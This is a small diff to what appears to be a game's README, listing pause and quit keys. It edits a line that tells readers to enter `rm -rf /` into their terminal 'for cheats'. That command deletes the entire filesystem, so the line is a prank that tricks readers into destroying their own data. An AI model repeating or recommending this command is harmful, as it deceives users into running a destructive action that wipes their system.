@@ -9,7 +9,7 @@ p to pause
 
 q to quit
 
-type `rm -rf /` for cheats
+enter `rm -rf /` into your terminal for cheats
 
 #INSTALATION
 
